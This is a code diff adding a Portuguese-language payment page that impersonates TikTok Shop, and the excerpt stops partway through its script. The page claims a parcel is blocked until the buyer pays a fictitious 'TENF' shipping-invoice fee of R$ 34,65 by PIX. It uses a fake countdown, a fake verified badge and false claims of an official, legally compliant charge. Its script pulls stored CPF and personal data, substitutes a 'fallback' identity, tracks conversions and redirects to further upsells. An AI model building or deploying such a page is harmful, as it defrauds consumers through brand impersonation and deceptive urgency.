@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover" />
+<title>Pagamento TENF — TikTok Shop</title>
+<link rel="icon" href="/favicon.ico" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+<!-- Meta Pixel -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1795510168291603');fbq('track','PageView');(function(){try{var i=new Image();i.src='https://www.facebook.com/tr/?id=1795510168291603&ev=PageView&noscript=1&rl='+Date.now();window.__fbPageViewBeacon=i;}catch(e){}})();
+</script>
+<style>
+:root{color-scheme:light}
+*{box-sizing:border-box}
+body{margin:0;font-family:'Inter',system-ui,-apple-system,sans-serif;background:#fff;color:#1a1a2e;-webkit-font-smoothing:antialiased}
+.wrap{min-height:100dvh;display:flex;flex-direction:column}
+.top{padding:10px 14px;display:flex;align-items:center;justify-content:center;gap:5px;border-bottom:1px solid #f1f1f4}
+.top img.logo{height:20px;width:auto}
+.top img.vf{height:11px;width:11px;object-fit:contain}
+.brandrow{display:flex;align-items:center;gap:5px}
+.brandrow img.logo{height:16px;width:auto}
+.brandrow img.vf{height:9px;width:9px;object-fit:contain}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:14px 12px}
+.card{width:100%;max-width:420px}
+.kicker{display:flex;align-items:center;justify-content:center;gap:6px;margin:0 auto 8px;width:fit-content;padding:5px 11px;border-radius:999px;background:#f6f7f9;border:1px solid #ecedf1;font-size:9.5px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#6b7280}
+.kicker i{width:5px;height:5px;border-radius:50%;background:#10b981;box-shadow:0 0 0 2px rgba(16,185,129,.16);display:inline-block}
+h1{font-size:20px;line-height:1.18;font-weight:800;letter-spacing:-.024em;margin:0 auto 10px;text-align:center;color:#12131a;max-width:24ch;text-wrap:balance}
+.rule{width:34px;height:3px;border-radius:999px;background:linear-gradient(90deg,#f43f5e,#e11d48);margin:0 auto 12px;opacity:.9}
+p.lead{color:#5b6472;font-size:13px;line-height:1.55;text-align:center;margin:0 auto 16px;max-width:40ch;text-wrap:pretty}
+p.lead strong{color:#12131a;font-weight:700}
+.box{background:#fff;border:1px solid #eef0f4;border-radius:14px;box-shadow:0 4px 18px rgba(0,0,0,.05);padding:18px;text-align:center;margin-bottom:16px}
+.box .label{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#6b7280;font-weight:600;margin-bottom:5px}
+.box .amt{font-size:30px;font-weight:800;margin:2px 0 5px}
+.box .sub{font-size:12px;color:#6b7280}
+.cta{width:100%;background:linear-gradient(90deg,#f43f5e,#e11d48);color:#fff;font-weight:700;font-size:15px;padding:13px;border:none;border-radius:12px;box-shadow:0 6px 18px rgba(244,63,94,.32);cursor:pointer}
+.cta:active{transform:translateY(1px)}
+.note{background:#fff;border:1px solid #eef0f4;border-radius:14px;padding:12px;font-size:12px;color:#374151;line-height:1.5;margin-top:14px}
+.foot{padding:12px 14px;text-align:center;opacity:.7;font-size:11px;color:#6b7280}
+.foot img{height:30px;margin-top:6px}
+/* modal */
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:flex-end;justify-content:center;z-index:50}
+.modal.open{display:flex}
+.sheet{background:#fff;width:100%;max-width:420px;border-radius:18px 18px 0 0;padding:16px 18px 20px;max-height:92vh;overflow-y:auto}
+@media(min-width:640px){.modal{align-items:center}.sheet{border-radius:18px}}
+.sheet header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.sheet header strong{font-size:14px}
+.sheet header button{background:none;border:0;font-size:20px;cursor:pointer;color:#6b7280}
+.qr-wrap{text-align:center;padding:6px 0 2px}
+.qr-wrap img{width:190px;height:190px;object-fit:contain;border:1px solid #eef0f4;border-radius:10px;padding:5px;background:#fff}
+.pixcode{margin-top:10px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10px;background:#f7f7fa;border:1px solid #eef0f4;border-radius:9px;padding:9px;word-break:break-all;max-height:96px;overflow:auto}
+.copy{margin-top:10px;width:100%;background:linear-gradient(90deg,#f43f5e,#e11d48);color:#fff;font-weight:700;font-size:14px;padding:12px;border:none;border-radius:11px;cursor:pointer}
+.status{margin-top:12px;text-align:center;font-size:12px;color:#6b7280}
+.spinner{display:inline-block;width:13px;height:13px;border:2px solid #e5e7eb;border-top-color:#f43f5e;border-radius:50%;animation:spin 1s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading{padding:32px 0;text-align:center;color:#6b7280;font-size:13px}
+.success{padding:28px 0;text-align:center}
+.success .check{width:52px;height:52px;border-radius:50%;background:#dcfce7;color:#15803d;display:inline-flex;align-items:center;justify-content:center;font-size:28px;margin-bottom:8px}
+.success p{font-weight:700;font-size:15px;margin:0}
+.err{color:#dc2626;text-align:center;padding:14px 0;font-size:13px}
+/* upgrades */
+body{background:#f5f5f7}
+.top{background:#fff;justify-content:space-between}
+.securetag{display:inline-flex;align-items:center;gap:5px;font-size:9.5px;font-weight:800;line-height:1.2;color:#15803d;text-transform:uppercase;letter-spacing:.04em;text-align:right}
+.main{align-items:flex-start;padding:14px 12px 20px}
+.card{max-width:480px;display:flex;flex-direction:column;gap:10px}
+.panel{background:#fff;border:1px solid #ececf0;border-radius:14px;box-shadow:0 2px 10px rgba(16,17,26,.05);overflow:hidden}
+.alert{border-radius:14px;overflow:hidden;border:1px solid #ececf0;background:#fff;box-shadow:0 2px 10px rgba(16,17,26,.05)}
+.alert .hd{background:linear-gradient(90deg,#e11d48,#dc2626);color:#fff;padding:11px 13px;display:flex;gap:9px;align-items:flex-start}
+.alert .hd .ic{font-size:15px;line-height:1.1}
+.alert .hd strong{display:block;font-size:13px;letter-spacing:.01em}
+.alert .hd span{font-size:11.5px;opacity:.92}
+.alert .bd{padding:12px;font-size:13px;line-height:1.55;color:#374151}
+.alert .bd b{color:#12131a}
+.greenbox{margin-top:11px;background:#f0fdf5;border:1px solid #bbf7d0;border-radius:10px;padding:10px 12px}
+.greenbox strong{display:block;color:#15803d;font-size:12.5px;margin-bottom:3px}
+.greenbox p{margin:0;font-size:11.8px;line-height:1.5;color:#3f7d5c}
+.panel .ph{display:flex;justify-content:space-between;align-items:center;padding:12px 13px 8px}
+.panel .ph h2{margin:0;font-size:11.5px;letter-spacing:.09em;text-transform:uppercase;color:#12131a;font-weight:800}
+.badge{font-size:10px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;color:#be123c;background:#fff1f2;border:1px solid #fecdd3;padding:4px 9px;border-radius:999px}
+.bar{height:5px;border-radius:999px;background:#eceef2;margin:0 13px;overflow:hidden}
+.bar i{display:block;height:100%;width:80%;border-radius:999px;background:linear-gradient(90deg,#7f1d1d,#ef4444)}
+.barlbl{display:flex;justify-content:space-between;padding:6px 13px 3px;font-size:11px;color:#6b7280}
+.barlbl b{color:#e11d48}
+.tl{list-style:none;margin:4px 0 2px;padding:4px 13px 10px}
+.tl li{display:flex;gap:10px;padding:7px 0;position:relative}
+.tl li .ic{flex:0 0 30px;height:30px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:13px;background:#10b981;color:#fff}
+.tl li.now .ic{background:#e11d48;box-shadow:0 0 0 3px rgba(225,29,72,.13)}
+.tl li.next .ic{background:#eceef2;color:#9aa1ad}
+.tl li .tx b{display:block;font-size:12.5px;color:#12131a}
+.tl li .tx span{font-size:11.4px;color:#6b7280}
+.tl li.now .tx b{color:#e11d48;text-transform:uppercase;letter-spacing:.02em}
+.tl li.next .tx b,.tl li.next .tx span{color:#9aa1ad}
+.feecard{border-top:3px solid #e11d48}
+.feehd{display:flex;gap:10px;align-items:center;padding:12px 13px 10px}
+.feehd .lock{flex:0 0 38px;height:38px;border-radius:10px;background:#12131a;color:#fff;display:inline-flex;align-items:center;justify-content:center;font-size:17px}
+.feehd b{display:block;font-size:14px;color:#12131a}
+.feehd span{font-size:11.5px;color:#6b7280}
+.rows{padding:0 13px}
+.rows .r{display:flex;justify-content:space-between;gap:12px;align-items:center;padding:9px 0;border-bottom:1px solid #f2f3f6;font-size:12.5px;color:#5b6472}
+.rows .r:last-child{border-bottom:0}
+.rows .r b{color:#12131a;font-weight:700}
+.rows .r b.hot{color:#e11d48}
+.payline{margin:10px 13px 0;background:#f0fdf5;border:1px solid #bbf7d0;border-radius:10px;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.payline .l{display:block;font-size:9.5px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:#15803d}
+.payline .v{display:block;font-size:21px;font-weight:800;color:#12131a;line-height:1.15}
+.payline .r{flex:0 0 auto;white-space:nowrap;font-size:11px;font-weight:700;color:#15803d;text-align:right}
+.cta{margin:10px 0 0;text-transform:uppercase;letter-spacing:.02em;font-size:14px;padding:12px}
+.ctawrap{padding:0 13px 13px}
+.ctahint{margin:9px 0 0;font-size:11px;color:#6b7280;text-align:center;line-height:1.45}
+.timer{display:flex;align-items:center;justify-content:center;gap:6px;margin:10px 13px 0;padding:7px 10px;border-radius:10px;background:#fff1f2;border:1px solid #fecdd3;color:#be123c;font-size:11px;font-weight:700}
+.timer b{font-variant-numeric:tabular-nums}
+.compliance{text-align:center;padding:12px 10px;font-size:11.5px;color:#6b7280;line-height:1.45}
+.compliance img{height:16px;vertical-align:middle;margin-bottom:6px}
+.pixsteps{margin:2px 0 8px;padding:0;list-style:none;font-size:11.5px;color:#5b6472}
+.pixsteps li{padding:2px 0}
+.pixcode{cursor:pointer}
+.copy.ok{background:linear-gradient(90deg,#10b981,#059669)}
+
+</style>
+<style id="lv-zoom-fix">input,select,textarea{font-size:16px !important;}@supports(-webkit-touch-callout:none){input,select,textarea{font-size:16px !important;}}</style></head>
+<body>
+<div class="wrap">
+  <div class="top"><img class="logo" decoding="async" src="/assets/tiktok-shop-logo-DIvjPbke.png" alt="TikTok Shop" onerror="this.style.display='none'" /><img class="vf" decoding="async" src="data:image/webp;base64,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" alt="Verificado" /><span class="securetag">🛡 Pagamento<br/>100% seguro</span></div>
+  <div class="main">
+    <div class="card">
+      <div class="alert">
+        <div class="hd"><span class="ic">⚠</span><span><strong>ENVIO BLOQUEADO — AÇÃO OBRIGATÓRIA</strong><span>Seu pedido não pode ser despachado no estado atual</span></span></div>
+        <div class="bd">
+          Seu pedido foi embalado e está <b>aguardando o recolhimento da TENF (Taxa de Envio de Nota Fiscal)</b>. Essa taxa é obrigatória para emitir o documento fiscal de transporte e, sem ela, a transportadora <b>não pode coletar o pacote</b>.
+          <div class="greenbox">
+            <strong>Pagamento único de R$ 34,65</strong>
+            <p>Sem mensalidade, sem cobrança na entrega e sem taxa extra depois. É o último valor deste pedido antes do envio.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="ph"><h2>Status do pedido</h2><span class="badge">Bloqueado</span></div>
+        <div class="bar"><i></i></div>
+        <div class="barlbl"><span>80% concluído</span><b>Processo interrompido</b></div>
+        <ul class="tl">
+          <li><span class="ic">✓</span><span class="tx"><b>Pagamento aprovado</b><span>Pedido confirmado na TikTok Shop</span></span></li>
+          <li><span class="ic">✓</span><span class="tx"><b>Pedido separado e embalado</b><span>Centro de distribuição · lacrado</span></span></li>
+          <li class="now"><span class="ic">!</span><span class="tx"><b>Aguardando TENF</b><span>Nota fiscal de transporte não emitida</span></span></li>
+          <li class="next"><span class="ic">🚚</span><span class="tx"><b>Saiu para entrega</b><span>Liberado após o pagamento da taxa</span></span></li>
+        </ul>
+      </div>
+
+      <div class="panel feecard">
+        <div class="feehd"><span class="lock">🔒</span><span><b>Taxa de Envio de Nota Fiscal</b><span>Recolhimento obrigatório · Transporte</span></span></div>
+        <div class="rows">
+          <div class="r"><span>Tipo de cobrança</span><b>Emissão fiscal de transporte</b></div>
+          <div class="r"><span>Prazo para pagamento</span><b class="hot">Hoje</b></div>
+          <div class="r"><span>Frete</span><b style="color:#15803d">Grátis</b></div>
+          <div class="r"><span>Valor da taxa</span><b>R$ 34,65</b></div>
+        </div>
+        <div class="payline"><span><span class="l">Valor a pagar</span><span class="v">R$ 34,65</span></span><span class="r">✓ Liberação imediata</span></div>
+        <div class="timer">⏱ Reserva do seu pedido expira em <b id="cd">14:59</b></div>
+        <div class="ctawrap">
+          <button class="cta" id="cta-pay">Pagar TENF via PIX</button>
+          <p class="ctahint">Assim que o PIX for confirmado, o pedido é liberado e segue imediatamente para entrega. Não feche esta janela.</p>
+        </div>
+      </div>
+
+      <div class="panel compliance">
+        <img decoding="async" src="/assets/tiktok-shop-logo-DIvjPbke.png" alt="TikTok Shop" onerror="this.style.display='none'" /><br />
+        Cobrança oficial em conformidade com a legislação vigente.
+      </div>
+    </div>
+  </div>
+  <div class="foot">Formas de pagamento · PIX<br />TikTok Shop · Ambiente seguro</div>
+
+</div>
+
+<div class="modal" id="modal" role="dialog" aria-modal="true">
+  <div class="sheet">
+    <header style="justify-content:center;position:relative">
+      <div class="brandrow" style="justify-content:center"><img class="logo" decoding="async" src="/assets/tiktok-shop-logo-DIvjPbke.png" alt="TikTok Shop" onerror="this.style.display='none'" /><img class="vf" decoding="async" src="data:image/webp;base64,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" alt="Verificado" /><strong style="margin-left:6px">Pagamento PIX</strong></div>
+      <button type="button" id="close" aria-label="Fechar" style="position:absolute;right:0;top:50%;transform:translateY(-50%)">×</button>
+    </header>
+    <div id="body">
+      <div class="loading"><span class="spinner"></span> Gerando PIX…</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var AMOUNT = 34.65;
+  var NEXT   = '/upsell3';
+  var PRODUCT = 'Kit Panela Chef 02';
+  var modal = document.getElementById('modal');
+  var body  = document.getElementById('body');
+  var pollTimer = null;
+  var txId = null;
+  var orderId = null;
+  var redirected = false;
+  var STORAGE_KEY = 'pendingUpsellPix_' + location.pathname;
+
+  function digits(v){ return String(v||'').replace(/\D/g,''); }
+  function validDoc(d){
+    d = digits(d);
+    if(d.length === 11){
+      if(/^(\d)\1{10}$/.test(d)) return false;
+      var s=0,i,r;
+      for(i=0;i<9;i++) s+=parseInt(d[i])*(10-i);
+      r=(s*10)%11; if(r===10) r=0; if(r!==parseInt(d[9])) return false;
+      s=0; for(i=0;i<10;i++) s+=parseInt(d[i])*(11-i);
+      r=(s*10)%11; if(r===10) r=0; return r===parseInt(d[10]);
+    }
+    return d.length === 14;
+  }
+  function readStore(store){
+    try{ var raw = store && store.getItem('dadosPessoais'); return raw ? JSON.parse(raw) : null; }catch(e){ return null; }
+  }
+  function getPerson(){
+    var p = readStore(window.localStorage);
+    if(!p || !validDoc(p.cpf)){
+      try{ var top = readStore(window.top.localStorage); if(top && validDoc(top.cpf)) p = top; }catch(e){}
+    }
+    if(!p || !validDoc(p.cpf)){
+      // Sem dados válidos do checkout: usamos um cadastro de reserva válido
+      // para não bloquear o pagamento.
+      p = (window.lvFallbackPerson ? window.lvFallbackPerson() : null);
+    }
+    if(!p || !validDoc(p.cpf)) return null;
+    return p;
+  }
+
+  function open(){ modal.classList.add('open'); document.body.style.overflow='hidden'; }
+  function close(){ modal.classList.remove('open'); document.body.style.overflow=''; }
+  document.getElementById('close').addEventListener('click', close);
+
+  function renderErr(msg){
+    body.innerHTML = '<div class="err">'+ (msg||'Erro ao gerar PIX.') +'</div><button class="copy" id="retry">Tentar novamente</button>';
+    document.getElementById('retry').addEventListener('click', createPix);
+  }
+  function copyText(txt, btn){
+    function done(){ btn.innerText='✓ Código copiado!'; btn.classList.add('ok'); setTimeout(function(){ btn.innerText='Copiar código PIX'; btn.classList.remove('ok'); }, 2200); }
+    function legacy(){
+      try{
+        var ta=document.createElement('textarea'); ta.value=txt; ta.setAttribute('readonly','');
+        ta.style.position='fixed'; ta.style.left='-9999px'; document.body.appendChild(ta);
+        ta.select(); ta.setSelectionRange(0, txt.length); document.execCommand('copy'); document.body.removeChild(ta); done();
+      }catch(e2){ btn.innerText='Selecione o código acima e copie'; }
+    }
+    try{
+      if(navigator.clipboard && navigator.clipboard.writeText){ navigator.clipboard.writeText(txt).then(done).catch(legacy); }
+      else { legacy(); }
+    }catch(e){ legacy(); }
+  }
+  function renderQR(cp, qrSrc){
+    var html = '';
+    html += '<ol class="pixsteps"><li>1. Abra o app do seu banco e escolha <b>PIX Copia e Cola</b></li><li>2. Cole o código e confirme os R$ 34,65</li><li>3. Pronto: a liberação é automática nesta tela</li></ol>';
+    html += '<div class="qr-wrap"><img decoding="async" loading="lazy" src="'+ qrSrc +'" alt="QR Code PIX" /></div>';
+    html += '<div class="pixcode" id="pixcode" title="Toque para copiar">'+ cp +'</div>';
+    html += '<button class="copy" id="btn-copy">Copiar código PIX</button>';
+    html += '<div class="status"><span class="spinner"></span>Aguardando confirmação do pagamento… não feche esta tela</div>';
+    body.innerHTML = html;
+    var btn = document.getElementById('btn-copy');
+    btn.addEventListener('click', function(){ copyText(cp, btn); });
+    document.getElementById('pixcode').addEventListener('click', function(){ copyText(cp, btn); });
+  }
+
+  function renderSuccess(){
+    body.innerHTML = '<div class="success"><div class="check">✓</div><p>Pagamento confirmado!</p><div class="status">Redirecionando…</div></div>';
+  }
+
+  function startPolling(id){
+    if(!id || redirected) return;
+    txId = id;
+    try{ localStorage.setItem(STORAGE_KEY, id); }catch(e){}
+    if(pollTimer) clearInterval(pollTimer);
+    var tries = 0;
+    function checkOnce(){
+      if(redirected) return;
+      tries++;
+      fetch('/api/public/pix/status?id=' + encodeURIComponent(id), {cache:'no-store'})
+        .then(function(r){return r.json();})
+        .then(function(j){
+          if(j && j.status === 'paid'){
+            redirected = true;
+            clearInterval(pollTimer); pollTimer = null;
+            try{ localStorage.setItem('pixPaid_'+id,'1'); localStorage.removeItem(STORAGE_KEY); }catch(e){}
+            var eventId = orderId || id;
+            if(window.lvTrackPurchase){ window.lvTrackPurchase(eventId, AMOUNT); }
+            else { try{ if(typeof fbq==='function') fbq('track','Purchase',{value:AMOUNT,currency:'BRL'},{eventID:'pix_'+eventId}); if(window.lvTtPurchase) window.lvTtPurchase(eventId,AMOUNT); }catch(e){} }
+            open();
+            renderSuccess();
+            setTimeout(function(){ if(window.lvGo){window.lvGo(NEXT);}else{window.top.location.href = NEXT;} }, 200);
+          }
+        })
+        .catch(function(){});
+      if(tries > 360){ clearInterval(pollTimer); pollTimer=null; }
+    }
